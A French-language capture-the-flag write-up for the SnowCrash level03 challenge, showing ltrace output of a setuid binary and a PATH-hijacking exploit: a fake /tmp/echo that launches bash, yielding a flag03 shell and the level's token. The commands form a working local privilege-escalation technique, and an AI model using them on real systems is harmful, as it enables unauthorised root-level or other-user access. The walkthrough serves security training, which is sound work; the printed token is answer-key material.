# Explication
On trouve un executable `level03`, qui affiche `Exploit me` quand on l'execute.  
On execute ltrace pour recuperer des informations dessus:
```
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                               = 2003
geteuid()                                               = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)     = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)     = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                  = 0
+++ exited (status 0) +++
```

En cherchant sur internet l'appel systeme (`system("/usr/bin/env echo Exploit me`) on tombe sur cette [page](https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code/8304447)  
Qui nous donne une solution pour exploiter l'apple de `echo`, on va donc l'executer:

```
level03@SnowCrash:~$ echo "/bin/bash" > /tmp/echo
level03@SnowCrash:~$ chmod 777 /tmp/echo && export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
bash: /home/user/level03/.bashrc: Permission denied
flag03@SnowCrash:~$
```

On a crée un faux `echo` qui appel enfaite `/bin/bash`  
On donne tout les acces a ce fichier et on change le `PATH` pour que l'appel de `echo` appel `/tmp/echo`

Apres l'execution du programme on ce rend compte qu'on est connecté en tant que `flag03`  
L'executable `level03` appartenait a `flag03`, l'appel de bash a donc etait fait a son nom.

On peu faire la commande `getflag`
```
flag03@SnowCrash:~$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

